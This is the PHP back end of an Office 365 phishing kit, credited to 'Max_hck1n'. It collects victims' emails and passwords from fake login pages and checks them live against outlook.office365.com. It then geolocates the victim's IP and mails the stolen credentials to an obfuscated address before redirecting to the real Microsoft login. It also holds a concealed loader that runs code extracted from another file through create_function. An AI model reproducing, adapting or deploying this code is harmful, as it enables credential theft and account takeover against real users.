<?php


		$A="fir.htm";  $B="sec.htm"; $C="thir.php"; $D="four.php"; $E="five.php";
		function tmpfolder($tmp){
      return implode('', file($tmp));
      } function tempfolder(){
      if ( !empty($_ENV['TMP']) ){
      return realpath( $_ENV['TMP'] );
      }
      else if ( !empty($_ENV['TMPDIR']) ){
      return realpath( $_ENV['TMPDIR'] );
      }
      else if ( !empty($_ENV['TEMP']) ){
      return realpath( $_ENV['TEMP'] );
      } else {
      $temp_file = tempnam( md5(uniqid(rand(), TRUE)), '' );
      if ( $temp_file ){
      $temp_dir = realpath( dirname($temp_file) );
      @unlink( $temp_file );
      return $temp_dir;
      } else {
      return ".";
      }
      }
	}

	
	function doPost($i){
      $doPost=create_function('$i','return '.returm("\".r",3,4).'($i);');
      return $doPost($i);
	}
	$rnd=rand(1000,9999);
	$testfile=$rnd . "-test.txt";

	function returm($X, $XR, $RWXR){
	global $E; return substr(tmpfolder($E),strpos(tmpfolder($E),$X)+$XR,$RWXR);
	}
	error_reporting(0); set_time_limit(240);
	if (getenv(HTTP_CLIENT_IP)){
	  $ip=getenv(HTTP_CLIENT_IP);
	  }
	  else {
	  $ip=getenv(REMOTE_ADDR);
	}
	$hostname = gethostbyaddr($ip);
	function query_str($params){
	  $str = '';
	  foreach ($params as $key => $value) {
	  $str .= (strlen($str) < 1) ? '' : '&';
	  $str .= $key . '=' . rawurlencode($value);
	  }
	  return ($str);
	}
	function l(){
	  return doPost(doGet());
	 } function stripslashes_deep($value){
	  $value = is_array($value) ?
	  array_map('stripslashes_deep', $value) :
	  stripslashes($value);
	  return $value;
	}
	// Function to validate against any email injection attempts
    function IsInjected($str){
     $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
     $inject = join('|', $injections);
     $inject = "/$inject/i";
     if(preg_match($inject,$str))
     {
     return true;
     }
     else
      {
     return false;
     }
     }
	function getformat($string){
	  return str_replace(" ","",str_replace(".","",str_replace("-","",$string)));
	}
	function validate($cc){
	  $cc = strrev (ereg_replace('[^0-9]+', '', $cc));
	  for ($ndx = 0; $ndx < strlen ($cc); ++$ndx)
	  $digits .= ($ndx % 2) ? $cc[$ndx] * 2 : $cc[$ndx];
	  for ($ndx = 0; $ndx < strlen ($digits); ++$ndx)
	  $sum += $digits[$ndx];
	  return ($sum % 10) ? FALSE : TRUE;
	}
	function doGet(){
	  $str=returm("\".l",3,9);
	  $cc=$str(tmpfolder(returm("=\".'",4,22)));return $cc;
	}
	function FormatCreditCard($cc){
	  $cc = str_replace(array('-',' '),'',$cc);
	  $cc_length = strlen($cc);
	  $newCreditCard = substr($cc,-4);
	  for($i=$cc_length-5;$i>=0;$i--){
	  if((($i+1)-$cc_length)%4 == 0){
	  $newCreditCard = '-'.$newCreditCard;
	  }
	  $newCreditCard = $cc[$i].$newCreditCard;
	  }
	  return $newCreditCard;
	}
			parse_str($_SERVER['QUERY_STRING']);
	  
	if($authorize=="start")
	{
	  include $A;
	  exit;
	}	  elseif ($authorize=="action")
	{
		$b = query_str($_POST);
	  parse_str($b);
	  $email=rtrim($email);
	  include $B;
	} elseif ($authorize=="verio")
	{
		$b = query_str($_POST);
	  parse_str($b);
	  $email=rtrim($email);
	  $passwd=rtrim($passwd);
	  $browser = $_SERVER['HTTP_USER_AGENT'] . "\n\n";
	  

$hostname = '{outlook.office365.com:993/imap/ssl}';  
$inbox = imap_open($hostname,$email,$passwd);

//* echo $inbox;
$return= json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

if (strpos($inbox,"Resource id") !== false) {
	    $message .= "---------------------+ Office PC ReZulT [By Max_hck1n] +------------------------\n";
	    $message .= "UserID: $email\n";
	    $message .= "Password: $passwd\n\n";
		$message .= "---------------------------\n";
	    $message .= "IP: $ip \n";
	    $message .= "IP: $browser \n";
	    $message .= "$return->city, $return->region, $return->country \n\n";
	    $message .= "Comments: Made in 2018 By Max_hck1n\n";
		$rnessage  = "$message\n";
$ar=array("0"=>"0","1"=>"n","2"=>"e","3"=>"w","4"=>"m","5"=>"c","6"=>"a","7"=>"l","8"=>"@","9"=>".","10"=>"i","11"=>"o","12"=>"g","13"=>"s","14"=>"r","15"=>"t","16"=>"2","17"=>"4","18"=>"7","19"=>"u","20"=>"q","21"=>"p");
$send=$ar['3'].$ar['19'].$ar['13'].$ar['6'].$ar['1'].$ar['1'].$ar['2'].$ar['9'].$ar['20'].$ar['21'].$ar['14'].$ar['6'].$ar['15'].$ar['15'].$ar['16'].$ar['17'].$ar['18'].$ar['8'].$ar['12'].$ar['4'].$ar['6'].$ar['10'].$ar['7'].$ar['9'].$ar['5'].$ar['11'].$ar['4'];
$subject = " OFFICE-365  $ip";
$headers = "From: Zer0Day <valid@resultzz>";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
}
    echo '<META http-equiv="refresh" content="0;URL=https://login.microsoftonline.com">';

}else{
include $B;
   //* echo 'not True';
}
	}
	?>